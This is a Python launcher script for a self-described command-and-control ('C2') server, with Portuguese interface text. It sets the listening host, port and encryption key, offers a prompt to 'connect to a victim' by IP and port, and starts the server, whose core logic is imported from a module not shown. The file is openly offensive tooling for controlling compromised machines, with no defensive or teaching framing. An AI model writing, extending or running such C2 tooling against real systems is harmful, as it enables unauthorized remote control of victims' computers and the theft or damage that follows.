#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
from core.server import C2Server

def main():
    parser = argparse.ArgumentParser(description='Servidor C2 Avançado')
    parser.add_argument('--host', default='0.0.0.0', help='Endereço de escuta do servidor')
    parser.add_argument('--port', type=int, default=4444, help='Porta de escuta do servidor')
    parser.add_argument('--key', help='Chave de criptografia para comunicação')
    parser.add_argument('--listen', action='store_true', help='Iniciar servidor automaticamente')
    parser.add_argument('--connect', help='Conectar a uma vítima (formato: ip:porta)')
    
    args = parser.parse_args()
    
    server = C2Server(host=args.host, port=args.port, encryption_key=args.key)
    
    # Conectar a uma vítima se especificado
    if args.connect:
        if ':' in args.connect:
            target_host, target_port = args.connect.split(':')
            try:
                target_port = int(target_port)
                server.connect_to_victim(target_host, target_port)
            except ValueError:
                print("[red]Porta deve ser um número[/red]")
                return
        else:
            print("[red]Formato inválido. Use: ip:porta[/red]")
            return
    
    if args.listen:
        server.run()
    else:
        server.display_banner()
        print("[green]Use 'help' para ver os comandos disponíveis[/green]")
        
        # Modo de configuração interativa antes de iniciar
        while True:
            try:
                cmd = input("c2-config > ").strip().split()
                
                if not cmd:
                    continue
                    
                if cmd[0].lower() == "set":
                    if len(cmd) < 3:
                        print("[red]Uso: set [host|port|key] [valor][/red]")
                    else:
                        setting = cmd[1].lower()
                        value = " ".join(cmd[2:])
                        
                        if setting == "host":
                            server.change_host(value)
                        elif setting == "port":
                            server.change_port(value)
                        elif setting == "key":
                            server.set_encryption_key(value)
                        else:
                            print("[red]Configuração inválida. Use: host, port ou key[/red]")
                
                elif cmd[0].lower() == "config":
                    server.show_config()
                    
                elif cmd[0].lower() == "start":
                    server.run()
                    break
                    
                elif cmd[0].lower() in ["exit", "quit"]:
                    print("[yellow]Saindo...[/yellow]")
                    return
                    
                elif cmd[0].lower() == "help":
                    print("""
Comandos de configuração:
- set host [ip]        - Definir endereço de escuta
- set port [porta]     - Definir porta de escuta
- set key [chave]      - Definir chave de criptografia
- config               - Mostrar configuração atual
- start                - Iniciar servidor
- exit                 - Sair
""")
                else:
                    print("[red]Comando não reconhecido. Use 'help' para ajuda.[/red]")
                    
            except KeyboardInterrupt:
                print("\n[yellow]Use 'exit' para sair[/yellow]")
            except Exception as e:
                print(f"[red]Erro: {e}[/red]")

if __name__ == "__main__":
    main()
